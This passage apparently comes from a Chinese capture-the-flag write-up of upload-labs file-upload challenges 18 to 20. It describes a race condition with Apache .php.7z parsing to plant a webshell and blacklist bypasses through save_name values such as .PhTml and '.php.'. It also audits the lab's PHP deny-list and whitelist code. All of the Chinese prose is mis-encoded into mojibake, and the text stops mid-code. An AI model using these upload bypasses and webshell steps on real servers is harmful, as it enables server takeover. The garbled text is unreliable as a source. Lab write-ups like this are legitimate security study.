è¿™ä¸€å…³ä¹Ÿç±»ä¼¼å­˜åœ¨æ¡ä»¶ç«äº‰çš„æ¼æ´ã€‚</p><h2 id="18-3-apacheè§£ææ¼æ´-æ¡ä»¶ç«äº‰"><a href="#18-3-apacheè§£ææ¼æ´-æ¡ä»¶ç«äº‰" class="headerlink" title="18.3 apacheè§£ææ¼æ´+æ¡ä»¶ç«äº‰"></a>18.3 apacheè§£ææ¼æ´+æ¡ä»¶ç«äº‰</h2><p>apacheè§£æä¸äº†.7zçš„åç¼€åï¼ŒæŠŠ1.php.7zçš„æ–‡ä»¶è§£æä¸º1.phpï¼Œå› æ­¤å¯é€šè¿‡.7zå®ç°ç»•è¿‡ï¼Œä½†åœ¨æ–‡ä»¶å¤¹ä¸­ç”Ÿæˆåä¼šè‡ªåŠ¨é‡å‘½åï¼Œå› æ­¤éœ€è¦è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œåœ¨phpæ–‡ä»¶ç”Ÿæˆçš„ä¸€ç¬é—´è®¿é—®å®ƒï¼Œè§¦å‘æ‰§è¡Œï¼Œåˆ›å»ºyjh.phpã€‚</p><p>1.æŠ“åŒ…ä¿®æ”¹ä¸Šä¼ create_webshell.php</p><p>ä¸Šä¼ create_webshell.phpï¼ˆç”Ÿæˆå°é©¬çš„æ–‡ä»¶ï¼‰ï¼Œä½¿ç”¨yakitå°†åç¼€åä¿®æ”¹ä¸º7zã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-31%2011.37.28.png" style="zoom:50%;"><p>2.å¹¶å‘ä¸Šä¼ </p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-31%2022.39.25.png" style="zoom:30%;"><p>3.å¹¶å‘è®¿é—®</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-31%2022.40.02.png" style="zoom:50%;"><p>èƒ½å¤ŸæˆåŠŸåœ¨æœåŠ¡å™¨å°†æ–‡ä»¶åæ”¹æˆ<code>æ•°å­—ä¸².7z</code>ä¹‹å‰è®¿é—®<code>create_webshell.php.7z</code>ï¼Œç„¶åç”±äºapacheå­˜åœ¨å°†<code>.php.7z</code>æ–‡ä»¶å½“ä½œ<code>.php</code>è„šæœ¬è§£æçš„æ¼æ´ï¼Œè§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œï¼Œåœ¨æœåŠ¡å™¨åˆ›å»ºwebshellã€‚</p><h2 id="18-4-getshell"><a href="#18-4-getshell" class="headerlink" title="18.4 getshell"></a>18.4 getshell</h2><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-31%2022.40.43.png" alt="æˆªå±2025-01-31 22.40.43"></p><p>æˆåŠŸåœ¨æœåŠ¡å™¨åˆ›å»ºä¸€å¥è¯æœ¨é©¬ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-31%2022.47.19.png" style="zoom:50%;"><p>èšå‰‘getshellï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-31%2022.48.10.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-31%2022.48.37.png" style="zoom:50%;"><h1 id="åä¹ã€Pass-19ï¼ˆé™Linux-é»‘åå•ç»•è¿‡ï¼‰"><a href="#åä¹ã€Pass-19ï¼ˆé™Linux-é»‘åå•ç»•è¿‡ï¼‰" class="headerlink" title="åä¹ã€Pass-19ï¼ˆé™Linux-é»‘åå•ç»•è¿‡ï¼‰"></a>åä¹ã€Pass-19ï¼ˆé™Linux-é»‘åå•ç»•è¿‡ï¼‰</h1><h2 id="19-1-é¢˜é¢"><a href="#19-1-é¢˜é¢" class="headerlink" title="19.1 é¢˜é¢"></a>19.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2009.40.08.png" style="zoom:50%;"><p>è¿™ä¸€å…³é¢˜é¢æœ‰äº›è®¸ä¸åŒï¼Œæœ‰ä¸€ä¸ªæŒ‡å®šä¿å­˜åç§°çš„å­—æ®µã€‚</p><h2 id="19-2-è§£é¢˜"><a href="#19-2-è§£é¢˜" class="headerlink" title="19.2 è§£é¢˜"></a>19.2 è§£é¢˜</h2><ul><li>ä¸Šä¼ yjh.phpï¼ŒæŒ‡å®šä¿å­˜ä¸ºyjh.php</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2009.56.08.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2009.56.31.png" style="zoom:50%;"><p>è¿›åˆ¶ä¿å­˜ä¸º.phpæ–‡ä»¶ã€‚</p><ul><li>ä¸Šä¼ yjh.phpï¼ŒæŒ‡å®šä¿å­˜ä¸ºyjh.jpg</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2009.57.21.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2009.57.41.png" style="zoom:50%;"><p>èƒ½å¤ŸæˆåŠŸä¸Šä¼ å›¾ç‰‡æœ¨é©¬ã€‚</p><ul><li>æŠ“åŒ…</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2010.02.05.png" style="zoom:50%;"><p>æ²¡æœ‰æ£€æµ‹MIMEç±»å‹ï¼Œä¹Ÿæ²¡æœ‰æ£€æµ‹æ–‡ä»¶å†…å®¹ã€‚</p><p>å¤šäº†ä¸ª<code>save_name</code>å­—æ®µï¼ŒæŒ‡å®šäº†è¦ä¿å­˜çš„æ–‡ä»¶å¤¹ã€‚åŸå§‹æ–‡ä»¶åä¸é‡è¦ï¼Œ<code>save_name</code>æ‰æ˜¯ä¿å­˜çš„æ–‡ä»¶åã€‚</p><ul><li>æ¢æµ‹æ£€æµ‹ç±»å‹</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2010.09.51.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2010.10.46.png" style="zoom:50%;"><p>.htaccessæ–‡ä»¶ä¸Šä¼ å¤±è´¥ã€‚ä½†æ˜¯ä¿®æ”¹å¤§å°å†™å¯ä»¥ä¸Šä¼ æˆåŠŸã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2010.11.41.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2010.12.54.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2010.14.31.png" style="zoom:50%;"><p>.PhTmlä¸Šä¼ æˆåŠŸä½†è®¿é—®å¤±è´¥ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2010.15.32.png" style="zoom:50%;"><p>php5åç¼€ç±»ä¼¼ï¼Œæ›´æ”¹å¤§å°å†™è™½ç„¶èƒ½å¤Ÿä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯æ— æ³•è§£æï¼Œå°å†™çš„php5åç¼€å‹æ ¹æ— æ³•ä¸Šä¼ ã€‚</p><p>phPä¹Ÿç±»ä¼¼ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2015.55.20.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2015.56.44.png" style="zoom:50%;"><p>æŠ¥é”™ä¿¡æ¯ä¸æ˜¯404ï¼Œè€Œæ˜¯æœåŠ¡å™¨é”™è¯¯ã€‚</p><ul><li>æç¤º</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.05.39.png" style="zoom:50%;"><ul><li>ä»£ç å®¡è®¡</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="ä»£ç è§£æï¼š-1"><a href="#ä»£ç è§£æï¼š-1" class="headerlink" title="ä»£ç è§£æï¼š"></a>ä»£ç è§£æï¼š</h4><ul><li><code>$is_upload</code>ï¼šç”¨äºæ ‡è¯†æ–‡ä»¶æ˜¯å¦æˆåŠŸä¸Šä¼ ï¼Œåˆå§‹å€¼ä¸º <code>false</code>ã€‚</li><li><code>$msg</code>ï¼šç”¨äºå­˜å‚¨ä¸Šä¼ è¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°çš„é”™è¯¯ä¿¡æ¯ï¼Œåˆå§‹å€¼ä¸º <code>null</code>ã€‚</li><li>æ£€æŸ¥ç”¨æˆ·æ˜¯å¦é€šè¿‡ POST æ–¹æ³•æäº¤äº†è¡¨å•ï¼ˆå³ç”¨æˆ·ç‚¹å‡»äº†â€œæäº¤â€æŒ‰é’®ï¼‰ã€‚</li><li>æ£€æŸ¥ä¸Šä¼ ç›®å½• <code>UPLOAD_PATH</code> æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™è·³è½¬åˆ° <code>else</code> éƒ¨åˆ†ï¼Œæç¤ºç”¨æˆ·æ‰‹åŠ¨åˆ›å»ºè¯¥ç›®å½•ã€‚</li><li><code>$deny_ext</code> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«äº†ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•åã€‚è¿™äº›æ‰©å±•åé€šå¸¸ä¸å¯æ‰§è¡Œè„šæœ¬æˆ–é…ç½®æ–‡ä»¶ç›¸å…³ï¼Œä¸Šä¼ è¿™äº›æ–‡ä»¶å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨æ¼æ´ã€‚</li><li><code>$file_name</code>ï¼šä»è¡¨å•ä¸­è·å–ç”¨æˆ·æŒ‡å®šçš„æ–‡ä»¶åã€‚</li><li><code>$file_ext</code>ï¼šä½¿ç”¨ <code>pathinfo()</code> å‡½æ•°æå–æ–‡ä»¶çš„æ‰©å±•åã€‚</li><li>æ£€æŸ¥æ–‡ä»¶çš„æ‰©å±•åæ˜¯å¦åœ¨ <code>$deny_ext</code> æ•°ç»„ä¸­ã€‚å¦‚æœä¸åœ¨æ•°ç»„ä¸­ï¼Œè¯´æ˜æ–‡ä»¶ç±»å‹æ˜¯å…è®¸çš„ï¼Œç»§ç»­å¤„ç†ä¸Šä¼ ï¼›å¦åˆ™ï¼Œè®¾ç½®é”™è¯¯ä¿¡æ¯ <code>$msg</code> ä¸ºâ€œç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼â€ã€‚</li><li><code>$temp_file</code>ï¼šè·å–ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶è·¯å¾„ã€‚</li><li><code>$img_path</code>ï¼šæŒ‡å®šæ–‡ä»¶ä¸Šä¼ åçš„ä¿å­˜è·¯å¾„ã€‚</li><li><code>move_uploaded_file()</code>ï¼šå°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šè·¯å¾„ã€‚å¦‚æœç§»åŠ¨æˆåŠŸï¼Œè®¾ç½® <code>$is_upload</code> ä¸º <code>true</code>ï¼Œè¡¨ç¤ºä¸Šä¼ æˆåŠŸï¼›å¦åˆ™ï¼Œè®¾ç½®é”™è¯¯ä¿¡æ¯ <code>$msg</code> ä¸ºâ€œä¸Šä¼ å‡ºé”™ï¼â€ã€‚</li></ul></blockquote><p>åˆ†æï¼š$file_name ä»è¡¨å•ä¸­è·å–ç”¨æˆ·æŒ‡å®šçš„æ–‡ä»¶åï¼Œ$file_extæå–æ–‡ä»¶åç¼€ï¼Œç„¶åæ£€æŸ¥æ˜¯å¦åœ¨é»‘åå•ï¼Œå¦‚æœä¸åœ¨ï¼Œæ‹¼æ¥$file_nameä¸ºæ–‡ä»¶åï¼Œæ‰€ä»¥æ ¸å¿ƒæ€è·¯å°±æ˜¯ç»•è¿‡é»‘åå•åç¼€åæ£€æµ‹ã€‚é€šè¿‡ä¹‹å‰çš„ç»éªŒï¼Œå¯ç”¨å¤§å°å†™ç»•è¿‡ï¼Œç©ºæ ¼ç»•è¿‡å’Œç‚¹å·ç»•è¿‡ç­‰æ–¹æ³•å°è¯•ç»•è¿‡é»‘åå•ã€‚</p><h2 id="19-3-åˆ‡æ¢åˆ°linuxç¯å¢ƒ"><a href="#19-3-åˆ‡æ¢åˆ°linuxç¯å¢ƒ" class="headerlink" title="19.3 åˆ‡æ¢åˆ°linuxç¯å¢ƒ"></a>19.3 åˆ‡æ¢åˆ°linuxç¯å¢ƒ</h2><p><a href="https://buuoj.cn/challenges#Upload-Labs-Linux">https://buuoj.cn/challenges#Upload-Labs-Linux</a>  ã€buuojã€‘</p><ul><li>ä¸Šä¼ å¹¶ä¿å­˜ä¸ºyjh.phpï¼ŒæŠ“åŒ…</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.21.47.png" style="zoom:50%;"><ul><li>.PhTml âœ…</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.24.21.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.24.57.png" style="zoom:50%;"><p>èƒ½å¤ŸæˆåŠŸè®¿é—®å¹¶getshell</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.25.30.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.26.29.png" style="zoom:50%;"><ul><li>.phP5</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.35.49.png" style="zoom:50%;"><ul><li>.php. âœ…</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.37.00.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.37.50.png" style="zoom:40%;"><ul><li>.php. . âœ…</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.39.48.png" style="zoom:50%;"><h1 id="äºŒåã€Pass-20-ï¼ˆåç¼€åç™½åå•æ£€æµ‹-æ•°ç»„ç»•è¿‡ï¼‰"><a href="#äºŒåã€Pass-20-ï¼ˆåç¼€åç™½åå•æ£€æµ‹-æ•°ç»„ç»•è¿‡ï¼‰" class="headerlink" title="äºŒåã€Pass-20***ï¼ˆåç¼€åç™½åå•æ£€æµ‹-æ•°ç»„ç»•è¿‡ï¼‰"></a>äºŒåã€Pass-20***ï¼ˆåç¼€åç™½åå•æ£€æµ‹-æ•°ç»„ç»•è¿‡ï¼‰</h1><h2 id="20-1-é¢˜é¢"><a href="#20-1-é¢˜é¢" class="headerlink" title="20.1 é¢˜é¢"></a>20.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.48.00.png" style="zoom:50%;"><p>é¢˜é¢è·ŸPass-19ç±»ä¼¼ã€‚</p><h2 id="20-2-è§£é¢˜"><a href="#20-2-è§£é¢˜" class="headerlink" title="20.2 è§£é¢˜"></a>20.2 è§£é¢˜</h2><p>ä¸Šä¼ yjh.phpï¼Œä¿å­˜æ–‡ä»¶åyjh.phpï¼ŒæŠ“åŒ…ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.51.35.png" style="zoom:50%;"><p><code>save_name</code>æ”¹æˆ.jpg</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.52.32.png" style="zoom:50%;"><p>æ— æ³•ä¸Šä¼ ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.54.22.png" style="zoom:50%;"><p>ä¿®æ”¹MIMEç±»å‹ï¼ŒæˆåŠŸä¸Šä¼ ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.55.36.png" style="zoom:50%;"><p>å°è¯•å¸¸è§„çš„ç»•è¿‡æ–¹æ³•ï¼šå¤§å°å†™ã€ç©ºæ ¼ã€. ã€::$DATAã€. . ç­‰æ²¡æœ‰æˆåŠŸã€‚</p><ul><li>æç¤º</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2016.57.46.png" style="zoom:50%;"><ul><li>ä»£ç å®¡è®¡</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//æ£€æŸ¥MIME</span>    <span class="token variable">$allow_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$allow_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment">//æ£€æŸ¥æ–‡ä»¶å</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$allow_suffix</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$allow_suffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string 